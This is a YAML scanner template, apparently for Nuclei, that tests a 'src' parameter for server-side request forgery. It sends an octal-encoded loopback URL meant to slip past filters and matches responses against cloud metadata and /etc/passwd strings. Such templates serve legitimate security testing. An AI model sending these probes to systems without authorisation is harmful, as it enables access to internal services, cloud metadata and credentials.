id: ssrf3-059
name: 'SSRF encoded IP via src'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via src (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      src:
        - 'http://0177.00.00.01/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
